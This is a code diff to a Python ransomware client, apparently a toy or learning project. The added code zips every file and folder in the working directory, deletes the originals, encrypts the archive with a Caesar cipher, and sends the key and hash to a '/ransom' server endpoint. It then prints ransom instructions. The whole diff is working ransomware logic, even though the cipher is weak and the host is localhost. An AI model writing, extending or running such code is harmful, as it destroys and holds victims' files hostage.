@@ -5,6 +5,8 @@ from hashlib import sha256
 from random import SystemRandom
 
 REQUEST_URL = 'http://localhost:5000/ransom?key={}&hash={}'
+ENCRYPT_PATH = 'encrypted_data'
+DECRYPT_PATH = 'decrypted_data'
 
 
 def caesar_keygen():
@@ -43,28 +45,47 @@ def caesar_decrypt(key, filepath):
     return bytearray(plaintext)
 
 
+def prepare_encryption():
+    '''
+    Zips all files in the current directory into a directory named
+    "encrypted_data.zip".
+    '''
+    for _, dirs, _ in os.walk(os.getcwd()):
+        for d in dirs:  # Zip all directories so they can be encrypted
+            shutil.make_archive(d, 'zip', d)
+            shutil.rmtree(d)
+    os.makedirs(ENCRYPT_PATH)
+    for filepath in os.listdir(os.getcwd()):
+        if ((filepath == 'client.py') or (filepath == 'instructions.txt')
+                or (filepath == ENCRYPT_PATH)):
+            continue
+        shutil.move(filepath, 'encrypted_data/' + filepath)
+    shutil.make_archive(ENCRYPT_PATH, 'zip', ENCRYPT_PATH)
+    shutil.rmtree(ENCRYPT_PATH)
+
+
 def encrypt():
     '''
     Run Caesar encryption of all files in this directory.
     '''
     key = caesar_keygen()
-    for _, dirs, _ in os.walk(os.getcwd()):
-        for d in dirs:  # Zip all directories so they can be encrypted
-            shutil.make_archive(d, 'zip', d)
-            shutil.rmtree(d)
+    prepare_encryption()
+    # Create a hash of the unencrypted zipfile
     digest = sha256()
-    for filepath in os.listdir(os.getcwd()):
-        if (filepath == 'client.py'):   # Don't let the ransomware self-encrypt
-            continue
-        with open(filepath, 'rb') as f:
-            digest.update(f.read())
-        ciphertext = caesar_encrypt(key, filepath)
-        with open(filepath, 'wb') as f:
-            f.write(ciphertext)
-    r = requests.get(REQUEST_URL.format(str(key), digest.hexdigest()))
+    with open(ENCRYPT_PATH + '.zip', 'rb') as f:
+        contents = f.read()
+        digest.update(contents)
+    sha_hash = digest.hexdigest()
+    # Encrypt the data
+    ciphertext = caesar_encrypt(key, ENCRYPT_PATH + '.zip')
+    with open(ENCRYPT_PATH + '.zip', 'wb') as f:
+        f.write(ciphertext)
+    # Send the hash and key to the ransomer and remove the variables
+    r = requests.get(REQUEST_URL.format(str(key), sha_hash))
     print(r)
     key, digest = None, None
     del key, digest
+    return sha_hash
 
 
 def decrypt(key, sha_hash):
@@ -73,21 +94,22 @@ def decrypt(key, sha_hash):
     decryption can be checked with the sha256 hash, although this is mostly
     for testing.
     '''
-    for filepath in os.listdir(os.getcwd()):
-        if (filepath == 'client.py'):
-            continue
-        plaintext = caesar_decrypt(key, filepath)
-        with open(filepath, 'wb') as f:
-            f.write(plaintext)
+    plaintext = caesar_decrypt(key, ENCRYPT_PATH + '.zip')
+    with open(ENCRYPT_PATH + '.zip', 'wb') as f:
+        f.write(plaintext)
     digest = sha256()
-    for filepath in os.listdir(os.getcwd()):
-        if (filepath == 'client.py'):
-            continue
-        with open(filepath, 'rb') as f:
-            digest.update(f.read())
+    with open(ENCRYPT_PATH + '.zip', 'rb') as f:
+        digest.update(f.read())
+    os.rename(ENCRYPT_PATH + '.zip', DECRYPT_PATH + '.zip')
     assert digest.hexdigest() == sha_hash   # Not neccessary, used for testing
 
 
 if __name__ == '__main__':
-    encrypt()
+    sha_hash = encrypt()
+    with open('instructions.txt', 'r') as f:
+        file_contents = f.read()
+    with open(ENCRYPT_PATH + '.zip', 'rb') as f:
+        data = f.read()
+    print(file_contents.format('0x' + str(sha_hash),
+                               '0x' + bytes.hex(data)))
     # print(r.text)
